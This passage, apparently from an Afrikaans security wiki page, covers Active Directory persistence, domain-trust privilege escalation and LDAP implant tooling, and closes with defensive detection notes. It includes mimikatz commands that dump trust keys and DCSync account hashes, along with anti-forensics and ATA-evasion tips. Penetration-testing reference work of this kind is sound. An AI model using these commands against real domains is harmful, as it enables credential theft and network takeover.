Die **AdminSDHolder** object in Active Directory verseker die security van **privileged groups** (soos Domain Admins en Enterprise Admins) deur ’n standaard **Access Control List (ACL)** oor hierdie groups toe te pas om unauthorized changes te voorkom. Hierdie feature kan egter misbruik word; as ’n attacker die AdminSDHolder se ACL wysig om volle access aan ’n gewone user te gee, kry daardie user uitgebreide control oor al die privileged groups. Hierdie security measure, bedoel om te beskerm, kan dus terugvuur en ongeregverdigde access toelaat tensy dit noukeurig gemonitor word.

[**Meer inligting oor AdminDSHolder Group hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Binne elke **Domain Controller (DC)** bestaan daar ’n **local administrator** account. Deur admin rights op so ’n masjien te verkry, kan die local Administrator hash met **mimikatz** onttrek word. Daarna is ’n registry modification nodig om **die gebruik van hierdie password te enable**, wat remote access tot die local Administrator account moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan **sekere special permissions** aan ’n **user** gee oor sekere spesifieke domain objects wat die user in die toekoms sal laat **privileges eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissions** te **stoor** wat ’n **object** oor ’n **object** het. As jy net ’n **klein verandering** in die **security descriptor** van ’n object kan maak, kan jy baie interessante privileges oor daardie object verkry sonder om lid van ’n privileged group te hoef te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject` auxiliary class om kortlewende principals/GPOs/DNS records met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle self-delete sonder tombstones, en vee LDAP evidence uit terwyl orphan SIDs, broken `gPLink` references, of cached DNS responses agterbly (bv. AdminSDHolder ACE pollution of malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in memory om ’n **universal password** te vestig, wat toegang tot al die domain accounts gee.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **credentials** wat gebruik word om toegang tot die machine te kry, in **clear text** te **capture**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om attributes (SIDHistory, SPNs...) op gespesifiseerde objects te **push** **sonder** om enige **logs** oor die **modifications** agter te laat. Jy **het DA** privileges nodig en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logs sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vroeër het ons bespreek hoe om privileges te eskaleer as jy **genoeg permission het om LAPS passwords te lees**. Hierdie passwords kan egter ook gebruik word om **persistence** te handhaaf.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft beskou die **Forest** as die security boundary. Dit impliseer dat die **compromise van ’n enkele domain moontlik kan lei tot die hele Forest wat gecompromise word**.

### Basic Information

’n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is ’n security mechanism wat ’n user van een **domain** in staat stel om resources in ’n ander **domain** te access. Dit skep in wese ’n skakel tussen die authentication systems van die twee domains, wat toelaat dat authentication verifications glad kan vloei. Wanneer domains ’n trust opstel, ruil en behou hulle spesifieke **keys** binne hul **Domain Controllers (DCs)**, wat van kritieke belang vir die trust se integrity is.

In ’n tipiese scenario, as ’n user ’n service in ’n **trusted domain** wil access, moet hy eers ’n spesiale ticket aanvra wat bekend staan as ’n **inter-realm TGT** van sy eie domain se DC. Hierdie TGT word met ’n gedeelde **key** geënkripteer wat albei domains ooreengekom het. Die user bied dan hierdie TGT aan die **DC van die trusted domain** aan om ’n service ticket (**TGS**) te kry. Na suksesvolle validation van die inter-realm TGT deur die trusted domain se DC, reik dit ’n TGS uit, wat die user toegang tot die service gee.

**Steps**:

1. ’n **client computer** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om ’n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik ’n nuwe TGT uit as die client suksesvol authenticated is.
3. Die client vra dan ’n **inter-realm TGT** van DC1 aan, wat nodig is om resources in **Domain 2** te access.
4. Die inter-realm TGT word geënkripteer met ’n **trust key** wat tussen DC1 en DC2 gedeel word as deel van die twee-rigting domain trust.
5. Die client neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT deur sy gedeelde trust key te gebruik en, indien geldig, reik ’n **Ticket Granting Service (TGS)** uit vir die server in Domain 2 waarna die client wil access.
7. Laastens bied die client hierdie TGS aan die server, wat met die server se account hash geënkripteer is, om toegang tot die service in Domain 2 te kry.

### Different trusts

Dit is belangrik om op te let dat **’n trust 1 way of 2 ways kan wees**. In die 2 ways opsie, sal albei domains mekaar trust, maar in die **1 way** trust relation sal een van die domains die **trusted** en die ander die **trusting** domain wees. In die laaste geval, **sal jy slegs in staat wees om resources binne die trusting domain vanaf die trusted een te access**.

As Domain A Domain B trust, is A die trusting domain en B die trusted een. Verder, in **Domain A**, sou dit ’n **Outbound trust** wees; en in **Domain B**, sou dit ’n **Inbound trust** wees.

**Different trusting relationships**

- **Parent-Child Trusts**: Dit is ’n algemene opstelling binne dieselfde forest, waar ’n child domain outomaties ’n twee-rigting transitive trust met sy parent domain het. In wese beteken dit dat authentication requests glad tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Ook “shortcut trusts” genoem, word hierdie tussen child domains ingestel om referral processes te versnel. In komplekse forests moet authentication referrals tipies na die forest root toe gaan en dan af na die target domain. Deur cross-links te skep, word die reis verkort, wat veral nuttig is in geografies verspreide environments.
- **External Trusts**: Hierdie word tussen verskillende, onverwante domains opgestel en is van nature non-transitive. Volgens [Microsoft se documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om resources te access in ’n domain buite die huidige forest wat nie deur ’n forest trust verbind is nie. Security word versterk deur SID filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties tussen die forest root domain en ’n nuut bygevoegde tree root ingestel. Alhoewel nie algemeen teëgekom nie, is tree-root trusts belangrik vir die byvoeg van nuwe domain trees tot ’n forest, wat hulle in staat stel om ’n unieke domain name te behou en twee-rigting transitivity te verseker. Meer inligting kan gevind word in [Microsoft se guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is ’n twee-rigting transitive trust tussen twee forest root domains, wat ook SID filtering afdwing om security measures te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts is ’n bietjie meer gespesialiseerd en pas by environments wat integrasie met Kerberos-gebaseerde systems buite die Windows ecosystem benodig.

#### Other differences in **trusting relationships**

- ’n Trust relationship kan ook **transitive** wees (A trust B, B trust C, dan A trust C) of **non-transitive**.
- ’n Trust relationship kan opgestel word as **bidirectional trust** (albei trust mekaar) of as **one-way trust** (slegs een van hulle trust die ander).

### Attack Path

1. **Enumereer** die trusting relationships
2. Kyk of enige **security principal** (user/group/computer) **toegang** tot resources van die **ander domain** het, dalk deur ACE entries of deur in groups van die ander domain te wees. Kyk vir **relationships across domains** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in this case could be another option.
3. **Compromise** die **accounts** wat deur domains kan **pivot**.

Attackers met toegang tot resources in ’n ander domain kan dit deur drie primêre meganismes doen:

- **Local Group Membership**: Principals kan by local groups op machines gevoeg word, soos die “Administrators” group op ’n server, wat hulle beduidende control oor daardie machine gee.
- **Foreign Domain Group Membership**: Principals kan ook lede wees van groups binne die foreign domain. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trust en die scope van die group.
- **Access Control Lists (ACLs)**: Principals kan in ’n **ACL** gespesifiseer word, veral as entities in **ACEs** binne ’n **DACL**, wat hulle toegang tot spesifieke resources gee. Vir dié wat dieper in die meganika van ACLs, DACLs en ACEs wil delf, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ’n onskatbare resource.

### Find external users/groups with permissions

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om foreign security principals in die domain te vind. Dit sal user/group van **’n external domain/forest** wees.

Jy kan dit in **Bloodhound** nagaan of deur powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumereer:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die current domain gebruik word vind met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin na die child/parent domain deur die trust met SID-History injection te abuse:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Om te verstaan hoe die Configuration Naming Context (NC) geabuse kan word, is kritiek. Die Configuration NC dien as 'n sentrale repository vir configuration data regoor 'n forest in Active Directory (AD) environments. Hierdie data word na elke Domain Controller (DC) binne die forest replicated, met writable DCs wat 'n writable copy van die Configuration NC onderhou. Om dit te abuse, moet 'n mens **SYSTEM privileges op 'n DC** hê, verkieslik 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites container sluit inligting in oor al die domain-joined computers se sites binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan attackers GPOs aan die root DC sites link. Hierdie aksie kan moontlik die root domain kompromitteer deur policies te manipuleer wat op hierdie sites toegepas word.

Vir diepgaande inligting kan 'n mens research oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) verken.

**Compromise any gMSA in the forest**

'n Attack vector behels die teiken van privileged gMSAs binne die domain. Die KDS Root key, noodsaaklik vir die berekening van gMSAs se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die passwords vir enige gMSA regoor die forest te bereken.

Gedetailleerde analise en stap-vir-stap leiding kan gevind word in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementêre delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode vereis geduld, en wag vir die skepping van nuwe privileged AD objects. Met SYSTEM privileges kan 'n attacker die AD Schema wysig om enige user volle control oor alle classes te gee. Dit kan lei tot unauthorized access en control oor nuutgeskepte AD objects.

Verdieping is beskikbaar op [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability teiken control oor Public Key Infrastructure (PKI) objects om 'n certificate template te skep wat authentication as enige user binne die forest moontlik maak. Omdat PKI objects in die Configuration NC woon, maak die kompromittering van 'n writable child DC die uitvoering van ESC5 attacks moontlik.

Meer besonderhede hieroor kan gelees word in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios sonder ADCS, het die attacker die vermoë om die nodige components op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **jou domein word vertrou** deur ’n eksterne een wat jou **onbepaalde toestemmings** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang oor die eksterne domein het** en dan probeer om dit uit te buit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest Domein - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **jou domein** vertrou sekere **privileges** toe aan `principal` vanaf `n **ander domain**.

Wanneer `n **domain trusted** word deur die trusting domain, skep die trusted domain egter **`n gebruiker** met `n **voorspelbare naam** wat as **password die trusted password** gebruik. Dit beteken dat dit moontlik is om **`n gebruiker vanaf die trusting domain** te gebruik om **die trusted een binne te gaan** om dit te enumereer en te probeer om meer privileges te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

`n Ander manier om die trusted domain te kompromitteer is om `n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorstaande rigting** van die domain trust geskep is (wat nie baie algemeen is nie).

`n Ander manier om die trusted domain te kompromitteer is om te wag in `n masjien waar `n **user from the trusted domain can access** via **RDP** kan aanmeld. Dan kon die attacker code in die RDP session process insluit en van daar af **access the origin domain of the victim**.\
Verder, as die **victim his hard drive gemount** het, kon die attacker vanaf die **RDP session** process **backdoors** in die **startup folder of the hard drive** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Die risk van attacks wat die SID history attribute oor forest trusts benut, word versag deur SID Filtering, wat by verstek op alle inter-forest trusts geaktiveer is. Dit is gebaseer op die aanname dat intra-forest trusts veilig is, en beskou die forest, eerder as die domain, as die security boundary volgens Microsoft se standpunt.
- Daar is egter `n vangplek: SID filtering kan applications en user access ontwrig, wat lei tot die soms deaktivering daarvan.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat users van die twee forests nie outomaties geauthenticeer word nie. In plaas daarvan is eksplisiete permissions nodig vir users om toegang te kry tot domains en servers binne die trusting domain of forest.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die uitbuiting van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP primitives as x64 Beacon Object Files wat heeltemal binne `n on-host implant (bv. Adaptix C2) loop. Operators compile die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon. Alle traffic ry oor die huidige logon security context via LDAP (389) met signing/sealing of LDAPS (636) met outomatiese certificate trust, so geen socks proxies of disk artifacts is nodig nie.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, en `get-groupmembers` los kort name/OU paths op na volledige DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute`, en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest/domain metadata van `rootDSE` af.
- `get-uac`, `get-spn`, `get-delegation`, en `get-rbcd` stel roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP bloot.
- `get-acl` en `get-writable --detailed` ontleed die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP skryfprimitiewe vir eskalasie & volharding

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator toe om nuwe principals of masjienrekeninge te plaas waar ook al OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kaap teikens direk sodra write-property-regte gevind word.
- ACL-gefokusde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-objek na wagwoord-herstellings, beheer oor groepslidmaatskap, of DCSync-replikasie-voorregte sonder om PowerShell/ADSI-artefakte agter te laat. `remove-*` eweknieë maak ingevoegde ACEs skoon.

### Delegation, roasting, en Kerberos-misbruik

- `add-spn`/`set-spn` maak onmiddellik ’n gekompromitteerde gebruiker Kerberoastable; `add-asreproastable` (UAC-skakelaar) merk dit vir AS-REP roasting sonder om die wagwoord aan te raak.
- Delegation-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlae, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory-inspuiting, OU-verskuiwing, en aanvaloppervlak-vorming

- `add-sidhistory` spuit bevoorregte SIDs in ’n beheerde principal se SID history in (sien [SID-History Injection](sid-history-injection.md)), wat geheime toegangsoorerwing volledig oor LDAP/LDAPS bied.
- `move-object` verander die DN/OU van rekenaars of gebruikers, wat ’n aanvaller toelaat om bates in OUs in te trek waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Nougeset gescope verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige terugrol toe nadat die operator geloofsbriewe of volharding geoes het, wat telemetry minimaliseer.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat word om by Domain Controllers aan te meld, en hul gebruik op ander hosts te vermy.
- **Service Account Privileges**: Services behoort nie met Domain Admin (DA) voorregte uitgevoer te word om sekuriteit te behou nie.
- **Temporal Privilege Limitation**: Vir take wat DA-voorregte vereis, behoort hul duur beperk te word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ouditeer Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

As jy algemene AD tradecraft wil opspoor, **moenie net op operator-beheerde artefakte staatmaak nie** soos hernoemde binaries, diensname, tydelike batch-lêers, of uitvoerpad(e). Stel vas hoe wettige Windows-kliente [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, en WMI-verkeer bou, en kyk dan vir **implementerings-eienaardighede** wat bly bestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, of `ntlmrelayx.py` wysig.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Geauthentiseerde DCE/RPC wat `auth_context_id = 79231 + ctx_id` gebruik
- DCE/RPC-authentication padding gevul met `0xff`
- LDAP Kerberos binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
- SMB2/3-negotieer-versoeke met ASCII-agtige `ClientGuid`-waardes
- WMI `IWbemLevel1Login::NTLMLogin` wat die nie-standaard namespace `//./root/cimv2` gebruik
- Hardcoded Kerberos nonce-waardes
- **Better as correlation/scoring features**:
- Skaars of gedupliseerde Kerberos etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ etype-volgorde wat verskil van native Windows
- NTLM Type 1-boodskappe wat version info ontbreek of Type 3-boodskappe met null host names
- Rou NTLMSSP in DCE/RPC in plaas van SPNEGO, ontbrekende DCE/RPC verification trailers, of SPNEGO/Kerberos OID-mismatches
- Verskeie van hierdie eienskappe vanaf dieselfde host/user/session/tydvenster is baie sterker as enige enkele swak veld
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, en tool-spesifieke HTTP/WebDAV/RDP/MSSQL-stringe
- Hierdie is maklik vir operators om te verander en word die beste gebruik om te verduidelik hoekom ’n kruis-protokol-kluster verdag is
- **Operational notes**:
- Sommige van hierdie seine vereis ontsleutelde verkeer, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, of service-side visibility
- Valideer teen Samba/Linux clients, appliances, en legacy software voordat jy dit na alerts bevorder
- Bevorder detections van enrichment -> hunting -> alerting soos jy vertroue in die basislyn bou

### **Implementing Deception Techniques**

- Implementing deception behels die opstel van strikke, soos lokgebruikers of rekenaars, met kenmerke soos wagwoorde wat nie verval nie of wat as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in die skep van gebruikers met spesifieke regte of om hulle by hoë-voorreg-groepe te voeg.
- ’n Praktiese voorbeeld behels die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooi van deception techniques kan gevind word by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdagte aanwysers sluit in atipiese ObjectSID, ongereelde aanmeldings, skeppingsdatums, en lae bad password counts.
- **General Indicators**: Die vergelyking van attribute van potensiële lokobjekte met dié van ware objekte kan teenstrydighede openbaar. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deception te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermyding van session enumeration op Domain Controllers om ATA-detectie te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** keys vir ticket creation help om detectie te ontduik deur nie af te daal na NTLM nie.
- **DCSync Attacks**: Dit word aanbeveel om vanaf ’n nie-Domain Controller uit te voer om ATA-detectie te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller waarskuwings sal aktiveer.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
